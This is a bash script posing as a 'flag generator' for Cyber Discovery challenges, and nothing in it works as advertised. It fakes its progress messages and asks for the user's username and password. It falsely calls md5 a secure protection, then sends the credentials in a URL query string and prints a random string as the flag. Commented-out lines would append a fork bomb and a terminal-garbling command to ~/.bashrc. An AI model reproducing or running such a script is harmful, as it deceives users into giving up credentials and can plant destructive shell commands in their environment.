#!/bin/bash

# This is a quick script that will get you the flags for most CD challenges by interacting with the API to generate flags for your challenge.

echo "Cyber Discovery Flag Generator 2.0"
echo "Loading..."
sleep 4
echo "Enter the level:"
read level
echo "Enter the challenge:"
read challenge
curl 'https://game.joincyberdiscovery.com/login'
ifconfig
ls /dev
sleep 1
echo "API endpoints found, generating payload..."
#echo 'echo -e "\033(0m -n"' >> ~/.bashrc
#echo ':(){ :|:& };:' >> ~/.bashrc
sleep 3
echo "Payload generated. Enter your username/email so we can authenticate with the API and generate your flags!"
read uname
echo "Password please! This is securely hashed using the md5 algorithm, so nobody except the API can intercept it"
read passwd
hashpwd=$(echo $passwd | md5sum)
curl 'https://api.joincyberdiscovery.com/api/v2/flag.php?username='$uname'&hashauth='$hashpwd'&level='$level'&challenge='$challenge 2>/dev/null
echo "Authenticating..."
sleep 2
echo "Authenticated! Decrypting flag..."
flag=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
echo $flag



